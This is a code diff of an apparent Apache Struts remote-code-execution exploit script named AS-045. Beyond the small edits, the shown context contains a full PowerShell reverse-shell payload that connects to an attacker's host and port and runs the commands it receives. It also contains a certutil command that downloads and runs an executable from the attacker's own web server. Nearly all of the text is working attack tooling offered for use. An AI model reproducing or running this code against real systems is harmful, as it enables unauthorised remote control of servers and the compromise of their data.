@@ -34,13 +34,9 @@ class AS045:
 			print('\n Usage : exploit.py RHOST RPORT Struts-directory cmd')
 
 		else:
-			def wshell(shell):
-				f = open( 'shelb', 'w' )
-				f.write(shell)
-				f.close()
-				print("\r\n[+] Initiating Omega Protocol [+]")
-
 			def pwrsh():
+				print("\r\n[+] (m4ud) AS-045 RCE [+]")
+				print("\r\n[*] Deploying PowerShell [*]\r\n")
 				payload = "$client = New-Object System.Net.Sockets.TCPClient('" + self.lhost + "'," + str(self.lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS(m4ud) ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 				payload = b64encode(payload.encode('UTF-16LE')).decode()
 				return payload
@@ -78,14 +74,16 @@ class AS045:
 			if self.osys == "1":
 				shell = "windows"
 				ext = "exe"
+
 				if self.shell == "1":
 					cmd = pwrsh()
-				else:
+				elif self.shell == "2":
 					venom(shell, ext)
 					srv()
 					os.system('mv shelb shelb.exe')
 					cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe;.\shelb.exe" % (self.lhost, self.wport)
 					cmd = b64encode(cmd.encode('UTF-16LE')).decode()
+
 			if self.osys == "2":
 				shell = "linux"
 				ext = "elf"
